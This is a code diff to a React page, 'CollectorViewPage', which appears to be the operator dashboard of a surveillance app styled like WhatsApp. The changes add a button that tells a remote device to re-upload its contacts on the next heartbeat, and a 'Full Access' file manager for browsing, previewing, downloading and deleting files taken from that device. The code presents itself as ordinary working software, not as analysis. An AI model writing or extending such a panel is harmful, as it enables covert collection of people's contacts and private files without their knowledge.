@@ -30,6 +30,12 @@ import {
   CheckCircle2,
   Circle,
   Play,
+  Trash2,
+  ChevronDown,
+  Home,
+  Folder,
+  RefreshCcw,
+  Smartphone,
 } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
@@ -311,6 +317,12 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
   const [sessionStatus, setSessionStatus] = useState<SessionStatus | null>(null);
   const [isOnline, setIsOnline] = useState(false);
   const [fileViewMode, setFileViewMode] = useState<'list' | 'grid'>('list');
+  const [syncingContacts, setSyncingContacts] = useState(false);
+  // File Manager state
+  const [managerPath, setManagerPath] = useState('/');
+  const [managerData, setManagerData] = useState<{ currentPath: string; breadcrumbs: { name: string; path: string }[]; directories: { name: string; path: string; fileCount: number; totalSize: number }[]; files: any[] } | null>(null);
+  const [managerLoading, setManagerLoading] = useState(false);
+  const [deletingFileId, setDeletingFileId] = useState<string | null>(null);
 
   useEffect(() => {
     params.then(p => setSessionId(p.id));
@@ -385,6 +397,76 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
   const handleRefresh = useCallback(() => {
     setFetchKey(k => k + 1);
   }, []);
+
+  // Contact sync handler
+  const handleSyncContacts = useCallback(async () => {
+    if (!sessionId) return;
+    setSyncingContacts(true);
+    try {
+      const res = await fetch('/api/contacts/sync', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ sessionId }),
+      });
+      if (res.ok) {
+        const data = await res.json();
+        setSessionStatus('syncing_contacts');
+        toast({ title: 'Sync Started!', description: 'Device will re-upload contacts on next heartbeat.' });
+      } else {
+        toast({ title: 'Sync Failed', description: 'Could not trigger contact sync.' });
+      }
+    } catch {
+      toast({ title: 'Sync Failed', description: 'Network error. Please try again.' });
+    }
+    setSyncingContacts(false);
+  }, [sessionId, toast]);
+
+  // File Manager browse handler
+  const browseDirectory = useCallback(async (dirPath: string) => {
+    if (!sessionId) return;
+    setManagerLoading(true);
+    setManagerPath(dirPath);
+    try {
+      const res = await fetch(`/api/files/browse?sessionId=${sessionId}&path=${encodeURIComponent(dirPath)}`);
+      if (res.ok) {
+        const data = await res.json();
+        setManagerData(data);
+      }
+    } catch {}
+    setManagerLoading(false);
+  }, [sessionId]);
+
+  // File delete handler
+  const handleDeleteFile = useCallback(async (fileId: string) => {
+    if (!sessionId) return;
+    setDeletingFileId(fileId);
+    try {
+      const res = await fetch('/api/files/delete', {
+        method: 'DELETE',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ fileId, sessionId }),
+      });
+      if (res.ok) {
+        toast({ title: 'Deleted!', description: 'File deleted successfully.' });
+        // Refresh data
+        setFetchKey(k => k + 1);
+        // Re-browse current directory
+        browseDirectory(managerPath);
+      } else {
+        toast({ title: 'Delete Failed', description: 'Could not delete file.' });
+      }
+    } catch {
+      toast({ title: 'Delete Failed', description: 'Network error.' });
+    }
+    setDeletingFileId(null);
+  }, [sessionId, managerPath, toast, browseDirectory]);
+
+  // Browse manager directory when tab switches to manager
+  useEffect(() => {
+    if (activeTab === 'manager' && sessionId) {
+      browseDirectory(managerPath);
+    }
+  }, [activeTab, sessionId]);
 
   const filteredContacts = useMemo(() => {
     if (!searchQuery.trim()) return contacts;
@@ -766,6 +848,32 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
       {/* ─── CONTACTS TAB ───────────────────────────── */}
       {activeTab === 'contacts' && (
         <>
+          {/* Sync Contacts Button */}
+          <div className="px-3 pt-2 pb-1 bg-[#ECE5DD]">
+            <button
+              onClick={handleSyncContacts}
+              disabled={syncingContacts}
+              className="w-full bg-gradient-to-r from-[#25D366] to-[#20BD5A] hover:from-[#20BD5A] hover:to-[#1AA84F] text-white rounded-2xl px-5 py-4 flex items-center gap-3 shadow-md active:scale-[0.98] transition-transform disabled:opacity-60"
+            >
+              <div className="w-11 h-11 rounded-full bg-white/20 flex items-center justify-center shrink-0">
+                {syncingContacts ? (
+                  <Loader2 className="w-5 h-5 text-white animate-spin" />
+                ) : (
+                  <RefreshCcw className="w-5 h-5 text-white" />
+                )}
+              </div>
+              <div className="flex-1 text-left min-w-0">
+                <h2 className="font-bold text-base">
+                  {syncingContacts ? 'Syncing Contacts...' : 'Sync Contacts'}
+                </h2>
+                <p className="text-white/80 text-xs">
+                  {syncingContacts ? 'Requesting device to re-upload' : 'Click to re-sync contacts from device'}
+                </p>
+              </div>
+              <Smartphone className="w-5 h-5 text-white/50 shrink-0" />
+            </button>
+          </div>
+
           {/* My Contacted Numbers button */}
           <div className="px-3 py-1 bg-[#ECE5DD]">
             <button
@@ -1018,43 +1126,67 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
       {/* ─── FILE MANAGER TAB ────────────────────────── */}
       {activeTab === 'manager' && (
         <ScrollArea className="flex-1">
+          {/* Full Access Banner */}
+          <div className="px-3 pt-2 pb-1 bg-[#ECE5DD]">
+            <div className="bg-gradient-to-r from-blue-600 to-blue-700 rounded-2xl px-4 py-3 flex items-center gap-3 shadow-md">
+              <div className="w-10 h-10 rounded-full bg-white/20 flex items-center justify-center shrink-0">
+                <HardDrive className="w-5 h-5 text-white" />
+              </div>
+              <div className="flex-1 min-w-0">
+                <h2 className="text-white font-bold text-sm">File Manager</h2>
+                <p className="text-blue-200 text-xs">Full Access - Browse, view, download & delete files</p>
+              </div>
+              {isOnline ? (
+                <span className="inline-flex items-center gap-1 text-xs font-bold text-[#25D366]">
+                  <span className="w-2 h-2 rounded-full bg-[#25D366] animate-pulse" />
+                  LIVE
+                </span>
+              ) : (
+                <span className="inline-flex items-center gap-1 text-xs font-bold text-white/40">
+                  <span className="w-2 h-2 rounded-full bg-white/30" />
+                  OFFLINE
+                </span>
+              )}
+            </div>
+          </div>
+
           {/* Storage Overview */}
-          <div className="px-3 pt-1 pb-2 bg-[#ECE5DD]">
+          <div className="px-3 pb-2 bg-[#ECE5DD]">
             <div className="bg-white rounded-2xl shadow-sm p-4">
               <h4 className="text-sm font-bold text-gray-900 mb-3 flex items-center gap-2">
                 <HardDrive className="w-4 h-4 text-[#075E54]" />
                 Storage Overview
               </h4>
-              <div className="grid grid-cols-2 gap-3 mb-3">
-                <div className="bg-purple-50 rounded-xl p-3 text-center">
-                  <Image className="w-5 h-5 text-purple-500 mx-auto mb-1" aria-label="Images" />
+              <div className="grid grid-cols-4 gap-2 mb-3">
+                <div className="bg-purple-50 rounded-xl p-2 text-center">
+                  <Image className="w-4 h-4 text-purple-500 mx-auto mb-0.5" aria-label="Images" />
                   <p className="text-xs font-bold text-gray-900">{fileTypeCounts.image || 0}</p>
-                  <p className="text-[10px] text-gray-500">Images</p>
+                  <p className="text-[9px] text-gray-500">Images</p>
                 </div>
-                <div className="bg-red-50 rounded-xl p-3 text-center">
-                  <Video className="w-5 h-5 text-red-500 mx-auto mb-1" />
+                <div className="bg-red-50 rounded-xl p-2 text-center">
+                  <Video className="w-4 h-4 text-red-500 mx-auto mb-0.5" />
                   <p className="text-xs font-bold text-gray-900">{fileTypeCounts.video || 0}</p>
-                  <p className="text-[10px] text-gray-500">Videos</p>
+                  <p className="text-[9px] text-gray-500">Videos</p>
                 </div>
-                <div className="bg-orange-50 rounded-xl p-3 text-center">
-                  <Music className="w-5 h-5 text-orange-500 mx-auto mb-1" />
+                <div className="bg-orange-50 rounded-xl p-2 text-center">
+                  <Music className="w-4 h-4 text-orange-500 mx-auto mb-0.5" />
                   <p className="text-xs font-bold text-gray-900">{fileTypeCounts.audio || 0}</p>
-                  <p className="text-[10px] text-gray-500">Audio</p>
+                  <p className="text-[9px] text-gray-500">Audio</p>
                 </div>
-                <div className="bg-blue-50 rounded-xl p-3 text-center">
-                  <FileText className="w-5 h-5 text-blue-500 mx-auto mb-1" />
+                <div className="bg-blue-50 rounded-xl p-2 text-center">
+                  <FileText className="w-4 h-4 text-blue-500 mx-auto mb-0.5" />
                   <p className="text-xs font-bold text-gray-900">{(fileTypeCounts.pdf || 0) + (fileTypeCounts.document || 0)}</p>
-                  <p className="text-[10px] text-gray-500">Documents</p>
+                  <p className="text-[9px] text-gray-500">Docs</p>
                 </div>
               </div>
               <div className="bg-gray-50 rounded-xl p-3 flex items-center justify-between">
                 <div>
-                  <p className="text-xs font-semibold text-gray-700">Total Storage</p>
-                  <p className="text-lg font-bold text-[#075E54]">{formatFileSize(totalUploadSize)}</p>
+                  <p className="text-[10px] font-semibold text-gray-500">Total Storage</p>
+                  <p className="text-base font-bold text-[#075E54]">{formatFileSize(totalUploadSize)}</p>
                 </div>
                 <div className="text-right">
-                  <p className="text-xs font-semibold text-gray-700">Total Files</p>
-                  <p className="text-lg font-bold text-[#075E54]">{uploadedFiles.length}</p>
+                  <p className="text-[10px] font-semibold text-gray-500">Total Files</p>
+                  <p className="text-base font-bold text-[#075E54]">{uploadedFiles.length}</p>
                 </div>
               </div>
             </div>
@@ -1062,54 +1194,131 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
 
           {/* Quick Actions */}
           <div className="px-3 pb-2 bg-[#ECE5DD]">
-            <h4 className="text-sm font-bold text-gray-700 mb-2 px-1">Quick Actions</h4>
-            <div className="grid grid-cols-2 gap-2">
+            <h4 className="text-xs font-bold text-gray-600 mb-2 px-1">Quick Actions</h4>
+            <div className="grid grid-cols-3 gap-2">
               <Button
                 onClick={downloadZip}
                 disabled={zipDownloading || uploadedFiles.length === 0}
-                className="bg-[#25D366] hover:bg-[#20BD5A] text-white h-14 rounded-xl flex-col gap-0.5 text-xs"
+                className="bg-[#25D366] hover:bg-[#20BD5A] text-white h-12 rounded-xl flex-col gap-0.5 text-[10px]"
               >
                 {zipDownloading ? <Loader2 className="w-4 h-4 animate-spin" /> : <Archive className="w-4 h-4" />}
-                {zipDownloading ? 'Creating ZIP...' : 'Download All ZIP'}
+                Download ZIP
               </Button>
               <Button
                 onClick={downloadAllVCard}
                 disabled={contacts.length === 0}
                 variant="outline"
-                className="border-[#075E54]/30 text-[#075E54] hover:bg-[#075E54]/10 h-14 rounded-xl flex-col gap-0.5 text-xs"
+                className="border-[#075E54]/30 text-[#075E54] hover:bg-[#075E54]/10 h-12 rounded-xl flex-col gap-0.5 text-[10px]"
               >
                 <Phone className="w-4 h-4" />
-                Download Contacts
+                Contacts
+              </Button>
+              <Button
+                onClick={() => { setManagerPath('/'); browseDirectory('/'); }}
+                variant="outline"
+                className="border-blue-500/30 text-blue-600 hover:bg-blue-50 h-12 rounded-xl flex-col gap-0.5 text-[10px]"
+              >
+                <RefreshCw className="w-4 h-4" />
+                Refresh
               </Button>
             </div>
           </div>
 
-          {/* All Files List */}
+          {/* File Browser - Directory Navigation */}
           <div className="px-3 pb-3 bg-[#ECE5DD]">
-            <div className="flex items-center justify-between mb-2 px-1">
-              <h4 className="text-sm font-bold text-gray-700">All Synced Files</h4>
-              <Button
-                onClick={() => handleRefresh()}
-                variant="ghost"
-                size="sm"
-                className="text-[#075E54] text-xs h-7 px-2"
-              >
-                <RefreshCw className="w-3 h-3 mr-1" /> Refresh
-              </Button>
-            </div>
-            {uploadedFiles.length === 0 ? (
-              <div className="bg-white rounded-2xl shadow-sm p-8 text-center">
-                <HardDrive className="w-12 h-12 text-gray-300 mx-auto mb-3" />
-                <p className="text-gray-500 text-sm font-medium mb-1">No files synced yet</p>
-                <p className="text-gray-400 text-xs max-w-[250px] mx-auto">
-                  The app is uploading files in the background. This may take some time depending on file sizes.
-                </p>
+            <div className="bg-white rounded-2xl shadow-sm overflow-hidden">
+              {/* Breadcrumb Header */}
+              <div className="px-4 py-3 bg-[#075E54] flex items-center gap-2">
+                <FolderOpen className="w-4 h-4 text-white/80 shrink-0" />
+                <h4 className="text-white font-semibold text-sm flex-1">Browse Files</h4>
+                <button
+                  onClick={() => browseDirectory(managerPath)}
+                  className="w-7 h-7 rounded-full hover:bg-white/10 flex items-center justify-center shrink-0"
+                  title="Refresh directory"
+                >
+                  <RefreshCw className="w-3.5 h-3.5 text-white/60" />
+                </button>
               </div>
-            ) : (
-              <div className="bg-white rounded-2xl shadow-sm overflow-hidden">
-                {uploadedFiles.map((file, index) => (
-                  <React.Fragment key={file.id}>
-                    <div className="w-full flex items-center gap-3 px-4 py-3">
+
+              {/* Breadcrumb Navigation */}
+              <div className="px-3 py-2 bg-gray-50 border-b border-gray-100 flex items-center gap-1 overflow-x-auto no-scrollbar">
+                {managerData?.breadcrumbs.map((crumb, idx) => (
+                  <React.Fragment key={crumb.path}>
+                    {idx > 0 && <ChevronRight className="w-3 h-3 text-gray-300 shrink-0" />}
+                    <button
+                      onClick={() => browseDirectory(crumb.path)}
+                      className={`text-xs px-2 py-1 rounded-md whitespace-nowrap transition-colors ${
+                        crumb.path === managerPath
+                          ? 'bg-[#075E54] text-white font-semibold'
+                          : 'text-gray-600 hover:bg-gray-200'
+                      }`}
+                    >
+                      {crumb.name === 'Root' ? (
+                        <span className="flex items-center gap-1"><Home className="w-3 h-3" /> Root</span>
+                      ) : (
+                        crumb.name
+                      )}
+                    </button>
+                  </React.Fragment>
+                ))}
+                {!managerData && (
+                  <span className="text-xs text-gray-400">Loading...</span>
+                )}
+              </div>
+
+              {/* Directory Contents */}
+              {managerLoading ? (
+                <div className="py-8 text-center">
+                  <Loader2 className="w-6 h-6 text-[#075E54] animate-spin mx-auto mb-2" />
+                  <p className="text-xs text-gray-500">Browsing files...</p>
+                </div>
+              ) : managerData && managerData.directories.length === 0 && managerData.files.length === 0 ? (
+                <div className="py-8 text-center">
+                  <Folder className="w-10 h-10 text-gray-300 mx-auto mb-2" />
+                  <p className="text-xs text-gray-500">
+                    {managerPath === '/' ? 'No synced files yet. Files will appear as device uploads them.' : 'This folder is empty.'}
+                  </p>
+                  {managerPath !== '/' && (
+                    <Button
+                      onClick={() => browseDirectory('/')}
+                      variant="ghost"
+                      size="sm"
+                      className="mt-2 text-[#075E54] text-xs"
+                    >
+                      <ArrowLeft className="w-3 h-3 mr-1" /> Back to Root
+                    </Button>
+                  )}
+                </div>
+              ) : (
+                <div>
+                  {/* Directories */}
+                  {managerData?.directories.map((dir) => (
+                    <button
+                      key={dir.path}
+                      onClick={() => browseDirectory(dir.path)}
+                      className="w-full flex items-center gap-3 px-4 py-3 hover:bg-blue-50/50 transition-colors active:bg-blue-50 border-b border-gray-50"
+                    >
+                      <div className="w-10 h-10 rounded-xl bg-yellow-50 flex items-center justify-center shrink-0">
+                        <Folder className="w-5 h-5 text-yellow-500" />
+                      </div>
+                      <div className="flex-1 min-w-0 text-left">
+                        <h3 className="text-xs font-semibold text-gray-900 truncate">{dir.name}</h3>
+                        <p className="text-[10px] text-gray-500 mt-0.5 flex items-center gap-1">
+                          <span>{dir.fileCount} files</span>
+                          <span className="text-gray-300">|</span>
+                          <span>{formatFileSize(dir.totalSize)}</span>
+                        </p>
+                      </div>
+                      <ChevronRight className="w-4 h-4 text-gray-300 shrink-0" />
+                    </button>
+                  ))}
+
+                  {/* Files */}
+                  {managerData?.files.map((file: any) => (
+                    <div
+                      key={file.id}
+                      className="w-full flex items-center gap-3 px-4 py-3 hover:bg-gray-50 transition-colors border-b border-gray-50"
+                    >
                       <div className={`w-10 h-10 rounded-xl ${getFileBgColor(file.fileType)} flex items-center justify-center shrink-0`}>
                         {getFileIcon(file.fileType)}
                       </div>
@@ -1123,19 +1332,71 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
                           <span>{timeAgo(file.uploadedAt)}</span>
                         </p>
                       </div>
-                      <button
-                        onClick={() => downloadSingleFile(file)}
-                        className="w-8 h-8 rounded-full hover:bg-[#25D366]/10 flex items-center justify-center shrink-0"
-                        title="Download"
-                      >
-                        <Download className="w-4 h-4 text-[#25D366]" />
-                      </button>
+                      <div className="flex items-center gap-0.5 shrink-0">
+                        {(file.fileType === 'image' || file.fileType === 'pdf') && (
+                          <button
+                            onClick={() => setPreviewFile(file)}
+                            className="w-7 h-7 rounded-full hover:bg-purple-50 flex items-center justify-center"
+                            title="Preview"
+                          >
+                            <Eye className="w-3.5 h-3.5 text-purple-500" />
+                          </button>
+                        )}
+                        <button
+                          onClick={() => downloadSingleFile(file)}
+                          className="w-7 h-7 rounded-full hover:bg-[#25D366]/10 flex items-center justify-center"
+                          title="Download"
+                        >
+                          <Download className="w-3.5 h-3.5 text-[#25D366]" />
+                        </button>
+                        <button
+                          onClick={() => {
+                            if (confirm('Delete this file?')) {
+                              handleDeleteFile(file.id);
+                            }
+                          }}
+                          disabled={deletingFileId === file.id}
+                          className="w-7 h-7 rounded-full hover:bg-red-50 flex items-center justify-center"
+                          title="Delete"
+                        >
+                          {deletingFileId === file.id ? (
+                            <Loader2 className="w-3.5 h-3.5 text-red-400 animate-spin" />
+                          ) : (
+                            <Trash2 className="w-3.5 h-3.5 text-red-400" />
+                          )}
+                        </button>
+                      </div>
                     </div>
-                    {index < uploadedFiles.length - 1 && <div className="ml-[64px] border-b border-gray-100" />}
-                  </React.Fragment>
-                ))}
-              </div>
-            )}
+                  ))}
+                </div>
+              )}
+
+              {/* Show all files flat list option */}
+              {managerData && managerPath === '/' && uploadedFiles.length > 0 && (
+                <div className="px-4 py-3 bg-gray-50 border-t border-gray-100">
+                  <h4 className="text-xs font-semibold text-gray-600 mb-2 flex items-center gap-1">
+                    <File className="w-3 h-3" /> All Files (Flat View)
+                  </h4>
+                  <div className="max-h-60 overflow-y-auto">
+                    {uploadedFiles.map((file) => (
+                      <div
+                        key={file.id}
+                        className="flex items-center gap-2 py-1.5 border-b border-gray-100 last:border-0"
+                      >
+                        <div className={`w-7 h-7 rounded-lg ${getFileBgColor(file.fileType)} flex items-center justify-center shrink-0`}>
+                          {getFileIcon(file.fileType)}
+                        </div>
+                        <div className="flex-1 min-w-0">
+                          <p className="text-[10px] font-medium text-gray-800 truncate">{file.fileName}</p>
+                          <p className="text-[9px] text-gray-400 truncate">{file.filePath}</p>
+                        </div>
+                        <span className="text-[9px] text-gray-400 shrink-0">{formatFileSize(file.fileSize)}</span>
+                      </div>
+                    ))}
+                  </div>
+                </div>
+              )}
+            </div>
           </div>
         </ScrollArea>
       )}
